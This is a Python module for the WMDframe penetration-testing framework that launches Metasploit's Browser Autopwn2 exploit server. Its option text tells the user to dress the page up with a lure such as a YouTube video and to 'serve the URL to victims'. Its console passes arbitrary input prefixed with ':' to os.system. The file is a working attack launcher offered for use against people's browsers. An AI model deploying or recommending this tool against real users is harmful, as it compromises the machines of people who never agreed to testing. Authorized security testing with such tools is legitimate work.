#!/usr/bin/env python3
#
# MIT - (c) 2016 ThomasTJ (TTJ)
# Module for WMDframe


import os
try:
    import core.core as core
    import core.commands as comm
    import core.modules as cmodules
    from core.colors import bc as bc
except:
    import sys
    sys.path.append('././')
    import core.core as core
    import core.commands as comm
    import core.modules as cmodules
    from core.colors import bc as bc


# Core
config = core.config()
logger = core.log()


# START Log files, global variables, etc.
METASPLOIT_SYM = (config['TOOLS']['METASPLOIT_SYM'])
# END Log files, global variables, etc.


# OPTIONS
class options():
    Author = 'Thomas TJ (TTJ)'
    Name = 'Browser Autopwn2'
    Call = 'browserpwn'
    Modulename = 'ms_browserautopwn'  # Filename
    Category = 'exploit'
    Type = 'browser'  # sin = single action/program, aut = multiple programs combined for attack
    Version = '0.1'
    License = 'MIT'
    Description = 'This module will automatically serve browser exploits (Arthur: sinn3r <sinn3r [at] metasploit.com>)'
    Datecreation = '2017/02/01'
    Lastmodified = '2017/02/01'

    def __init__(self):
        self.show_all()

    # Possible options. These variables are checked when the user tries to 'set' an option
    def poss_opt(self):
        return ('NA')

    # Show options
    def show_opt(self):
        print(
            ''
            + '\n\t' + bc.OKBLUE + 'OPTIONS - Recommended' + bc.ENDC
            + '\n\t' + 'Either remember these settings, or run the module with "invoke".'
            + '\n\t' + 'When firing up the MetasSploit module, configure it with these commands:'
            + '\n\t' + '  1) set URIPATH /'
            + '\n\t' + '  2) set VERBOSE true'
            + '\n\t' + '  3) set HTMLcontent Hello world, (change this to a YouTube video or personal html page)'
            + '\n\t' + '  4) Run the module with "run" or "exploit"'
            + '\n\t' + '  5) Serve the URL to victims (localIP:8080/)'
            + '\n'
            )

    # Show commands
    def show_commands(self):
        print(
            ''
            + '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC
            + '\n\t' + '---------'
            + '\n\t' + ('%-*s ->\t%s' % (9, 'run', 'Run the script'))
            + '\n\t' + ('%-*s ->\t%s' % (9, 'info', 'Information'))
            + '\n\t' + ('%-*s ->\t%s' % (9, 'so', 'Show options'))
            + '\n\t' + ('%-*s ->\t%s' % (9, 'sa', 'Show module info'))
            + '\n\t' + ('%-*s ->\t%s' % (9, 'invoke', 'Invoke module'))
            + '\n\t' + ('%-*s ->\t%s' % (9, 'exit', 'Exit'))
            + '\n'
            )

    # Show all info
    def show_all(self):
        cmodules.showModuleData(
            options.Author,
            options.Name,
            options.Call,
            options.Category,
            options.Type,
            options.Version,
            options.Description,
            options.License,
            options.Datecreation,
            options.Lastmodified
            )
        self.show_commands()
        self.show_opt()
# END OPTIONS


def run():
    print('')
    os.system(METASPLOIT_SYM + ' -x "use auxiliary/server/browser_autopwn2"')
    print('')


def info():
    print("""
        Module for use in WMDframe.

        This module serves MetaSploit\'s module: Browser Autopwn2.
        Browser Autopwn is the easiest and quickest way to explicitly
        test browser vulnerabilities without having the user to
        painfully learn everything there is about each exploit and
        the remote target before deployment.
        More info: https://community.rapid7.com/community/metasploit/blog/2015/07/16/the-new-metasploit-browser-autopwn-strikes-faster-and-smarter--part-2""")


# CONSOLE
def console():
    value = input('   -> ' + bc.FAIL + 'wmd' + bc.ENDC + '@' + bc.FAIL + 'browserpwn:' + bc.ENDC + ' ')
    userinput = value.split()
    if 'so' in userinput[:1]:
        sop.show_opt()
    elif 'sa' in userinput[:1]:
        sop.show_all()
    elif 'info' in userinput[:1]:
        info()
    elif 'run' in userinput[:1]:
        run()
    elif 'invoke' in userinput[:1]:
        comm.invokeModule(options.Call)
        return None
    elif 'back' in userinput[:1] or 'exit' in userinput[:1]:
        return None
    elif ':' in userinput[:1]:
        print('')
        os.system(str(value[1:]))
        print('')
    else:
        command = str(userinput[:1]).strip('[]\'')
        print(bc.WARN + '\n    Error, no options for: ' + command + '\n' + bc.ENDC)
    console()
# END console


def main():
    print('\n')
    print('\t    ____                                       ___         __                            ')
    print('\t   / __ )_________ _      __________  _____   /   | __  __/ /_____  ____ _      ______   ')
    print('\t  / __  / ___/ __ \ | /| / / ___/ _ \/ ___/  / /| |/ / / / __/ __ \/ __ \ | /| / / __ \  ')
    print('\t / /_/ / /  / /_/ / |/ |/ (__  )  __/ /     / ___ / /_/ / /_/ /_/ / /_/ / |/ |/ / / / /  ')
    print('\t/_____/_/   \____/|__/|__/____/\___/_/     /_/  |_\__,_/\__/\____/ .___/|__/|__/_/ /_/   ')
    print('\t                                                                /_/                      ')
    print('\n')
    print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
    comm.checkInstalled(METASPLOIT_SYM)
    print('')
    global sop
    # The parameters to be passed to the module on init
    sop = options()
    console()


# For testing uncomment "main()" and run module with "python3 modulename.py"
# main()
